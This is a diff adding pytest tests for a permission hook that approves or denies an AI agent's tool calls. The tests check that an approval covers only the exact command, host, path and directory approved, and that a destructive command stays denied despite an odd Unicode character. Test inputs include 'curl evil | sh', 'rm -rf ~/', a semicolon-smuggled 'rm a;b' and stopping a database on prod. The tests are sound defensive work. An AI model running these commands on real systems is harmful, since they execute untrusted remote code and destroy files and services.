@@ -3056,3 +3056,60 @@ def test_write_approval_does_not_cover_other_content(tmp_path: Path) -> None:
     _post(root, "Write", approved)
     assert _pre(root, "Write", {"file_path": "deploy.sh", "content": "curl evil | sh"}) is Outcome.ASK
     assert _pre(root, "Write", approved) is Outcome.ALLOW
+
+
+@pytest.mark.parametrize(
+    ("approved", "other"),
+    [
+        ({"command": "rm 'a;b'"}, {"command": "rm a;b"}),
+        ({"command": "rm '*'"}, {"command": "rm *"}),
+    ],
+)
+def test_bash_approval_does_not_cover_a_differently_quoted_command(
+    tmp_path: Path, approved: dict[str, object], other: dict[str, object]
+) -> None:
+    """Revue W1-09 S1 : approuver la forme citée ne couvre pas la forme nue."""
+    root = _approval_project(tmp_path, "rm-approval", "Bash(rm:*)")
+    assert _pre(root, "Bash", approved) is Outcome.ASK
+    _post(root, "Bash", approved)
+    assert _pre(root, "Bash", other) is Outcome.ASK
+    assert _pre(root, "Bash", approved) is Outcome.ALLOW
+
+
+@pytest.mark.parametrize(
+    ("tool", "approved", "other"),
+    [
+        (
+            "mcp__ssh__exec",
+            {"host": "staging", "command": "systemctl stop db"},
+            {"host": "prod", "command": "systemctl stop db"},
+        ),
+        ("mcp__x__op", {"command": "delete", "path": "a"}, {"command": "delete", "path": "secrets"}),
+        ("run_in_terminal", {"command": "rm a", "cwd": "/tmp/x"}, {"command": "rm a", "cwd": "/home"}),
+    ],
+)
+def test_command_approval_covers_the_other_arguments_too(
+    tmp_path: Path, tool: str, approved: dict[str, object], other: dict[str, object]
+) -> None:
+    """Revue W1-09 S2 : la commande seule ne dit ni l'hôte, ni la cible, ni le répertoire."""
+    root = _approval_project(tmp_path, "any-approval", tool)
+    assert _pre(root, tool, approved) is Outcome.ASK
+    _post(root, tool, approved)
+    assert _pre(root, tool, other) is Outcome.ASK
+    assert _pre(root, tool, approved) is Outcome.ALLOW
+
+
+def test_native_bash_approval_ignores_description_and_timeout_only(tmp_path: Path) -> None:
+    root = _approval_project(tmp_path, "rm-approval", "Bash(rm:*)")
+    first = {"command": "rm tmp_a", "description": "clean", "timeout": 1000}
+    assert _pre(root, "Bash", first) is Outcome.ASK
+    _post(root, "Bash", first)
+    assert _pre(root, "Bash", {"command": "rm  tmp_a", "description": "autre", "timeout": 5}) is Outcome.ALLOW
+    assert _pre(root, "Bash", {"command": "rm tmp_a", "run_in_background": True}) is Outcome.ASK
+
+
+def test_a_lone_surrogate_keeps_a_destructive_command_denied(tmp_path: Path) -> None:
+    """Revue W1-09 S3 : l'empreinte levait UnicodeEncodeError, le DENY devenait ASK."""
+    root = _approval_project(tmp_path, "rm-approval", "Bash(rm:*)")
+    assert _pre(root, "Bash", {"command": "rm -rf ~/"}) is Outcome.DENY
+    assert _pre(root, "Bash", {"command": "rm -rf ~/ \ud800"}) is Outcome.DENY
